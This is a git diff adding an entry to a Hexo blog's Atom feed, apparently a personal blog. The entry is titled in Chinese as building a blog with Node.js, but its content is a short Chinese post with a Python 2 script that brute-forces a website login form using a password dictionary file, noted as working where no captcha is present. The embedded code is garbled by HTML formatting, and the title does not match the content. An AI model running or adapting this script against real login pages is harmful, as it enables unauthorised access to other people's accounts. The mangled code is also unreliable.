@@ -198,6 +198,27 @@ INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.
   </entry>
   
   <entry>
+    <title>利用nodejs搭建博客</title>
+    <link href="https://aiwanxia.github.io/2017/03/05/1/"/>
+    <id>https://aiwanxia.github.io/2017/03/05/1/</id>
+    <published>2017-03-05T03:31:21.000Z</published>
+    <updated>2017-03-06T04:41:28.554Z</updated>
+    
+    <content type="html"><![CDATA[<p>根据字典文件,使用python进行暴力破解,程序很简单<br>注：针对没有验证码的情况<br>实例代码</p>
+<p> <code>#encoding=utf-8</code><br>    <code>import httplib,urllib</code><br>     <code>conn = httplib.HTTPConnection(&quot;www.xxx.cn&quot;)</code><br>     <code>f=open(&quot;dict.txt&quot;)</code><br>     <code>while 1:</code><br>         <code>pwd=f.readline().strip()</code><br>         <code>if not pwd:</code><br>             <code>print &#39;字典已比对完。&#39;</code><br>             <code>break</code><br>         <code>params = urllib.urlencode({&#39;username&#39;: &#39;xxx&#39;, &#39;mod&#39;: &#39;&#39;, &#39;password&#39;: pwd})</code><br>         <code>headers = {&quot;Content-type&quot;:</code>   <code>` </code> “application/x-www-form-urlencoded”,”Accept”: “text/plain”} <code>` conn.request(&quot;GET&quot;, &quot;/login/aaa.asp&quot;, params, headers)</code><br>        <code>r = conn.getresponse()</code><br>         <code>print r.status, r.reason</code><br>         <code>data1 = r.read().decode(&#39;gbk&#39;)#编码根据实际情况酌情处理</code><br>         <code>print data1.index(u&#39;您输入的密码有误&#39;),&#39;您输入的密码\&#39;%s\&#39;有误&#39;%pwd</code><br>     <code>conn.close()</code></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;根据字典文件,使用python进行暴力破解,程序很简单&lt;br&gt;注：针对没有验证码的情况&lt;br&gt;实例代码&lt;/p&gt;
+&lt;p&gt; &lt;code&gt;#encoding=utf-8&lt;/code&gt;&lt;br&gt;    &lt;code&gt;import httplib,urllib&lt;/code&gt;&lt;br&gt;   
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>never give up</title>
     <link href="https://aiwanxia.github.io/2017/03/05/never-give-up/"/>
     <id>https://aiwanxia.github.io/2017/03/05/never-give-up/</id>
